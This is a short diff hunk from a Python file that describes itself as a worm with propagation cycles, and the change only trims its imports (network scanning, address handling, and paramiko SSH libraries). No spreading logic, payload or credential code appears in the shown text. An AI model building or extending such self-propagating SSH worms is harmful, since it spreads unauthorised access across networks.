@@ -8,13 +8,13 @@ This worm does the following:
     used for the next propagation cycle.
 """
 
-import sys, os, base64, uuid, socket, asyncio, subprocess, threading, traceback, logging, codecs, re
+import sys, os, base64, uuid, asyncio, subprocess, threading, traceback, logging
 from datetime import datetime
 from random import shuffle
 from concurrent.futures import ThreadPoolExecutor
 
-import netifaces, nmap
-from netaddr import *
+import netifaces
+from netaddr import IPAddress, IPNetwork, AddrFormatError
 import paramiko
 from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException
 
